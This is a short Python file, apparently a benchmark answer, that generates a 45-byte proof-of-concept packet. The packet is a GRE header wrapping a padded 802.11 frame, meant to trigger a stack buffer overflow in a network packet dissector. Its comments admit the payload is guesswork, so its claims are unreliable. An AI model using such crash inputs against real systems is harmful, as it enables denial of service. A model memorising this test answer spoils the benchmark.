import os
import struct
import tarfile
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth PoC length is 45 bytes
        # Create a minimal PoC that triggers stack buffer overflow
        # by providing malformed GRE packet with 802.11 encapsulation
        
        # GRE header structure:
        # - Flags and version (2 bytes)
        # - Protocol type (2 bytes) - for 802.11 this should be 0x0002
        # Then the 802.11 frame
        
        # Craft a GRE packet that will cause the vulnerability:
        # 1. GRE header with protocol type for 802.11
        # 2. Malformed 802.11 frame that triggers buffer overflow
        
        # GRE header: C|R|K|S|s|Recur| Flags | Ver | Protocol Type
        # For minimal header without optional fields: 0x0000
        gre_flags_ver = 0x0000  # No optional fields, version 0
        gre_protocol = 0x0002   # Protocol type for 802.11
        
        # 802.11 frame structure:
        # Frame Control (2 bytes), Duration (2 bytes), Addr1-3 (6 bytes each)
        # Sequence Control (2 bytes), potentially more...
        # We'll craft a malformed frame that overflows
        
        # Create a payload that's 41 bytes to make total 45 bytes
        # (4 bytes GRE header + 41 bytes 802.11 frame)
        
        # The vulnerability is that the 802.11 dissector expects a pseudoheader
        # with radio information, but GRE provides flags+version instead.
        # By crafting a specific payload, we can trigger the overflow.
        
        # Create the GRE packet
        poc = bytearray()
        
        # GRE header (big-endian)
        poc.extend(struct.pack('>H', gre_flags_ver))  # Flags and version
        poc.extend(struct.pack('>H', gre_protocol))   # Protocol type
        
        # 802.11 frame that triggers the vulnerability
        # We'll use a pattern that's likely to trigger the overflow
        # when the dissector tries to process the pseudoheader
        
        # 802.11 frame control field (management frame, subtype 0)
        frame_control = 0x0000
        duration = 0x0000
        
        poc.extend(struct.pack('<H', frame_control))  # Frame Control
        poc.extend(struct.pack('<H', duration))       # Duration
        
        # MAC addresses (6 bytes each)
        # Use pattern that might trigger overflow
        addr_pattern = b'\x41' * 6  # "A" repeated 6 times
        
        poc.extend(addr_pattern)   # Address 1 (destination)
        poc.extend(addr_pattern)   # Address 2 (source)
        poc.extend(addr_pattern)   # Address 3 (BSSID)
        
        # Sequence control
        poc.extend(struct.pack('<H', 0x0000))
        
        # Frame body - fill with pattern to reach 45 bytes total
        # We need 41 bytes total for 802.11 frame, we have 2+2+6+6+6+2 = 24 bytes so far
        remaining_bytes = 41 - 24
        if remaining_bytes > 0:
            # Use pattern that might trigger buffer overflow when processed
            poc.extend(b'\x42' * remaining_bytes)  # "B" pattern
        
        # Ensure total length is exactly 45 bytes
        return bytes(poc[:45])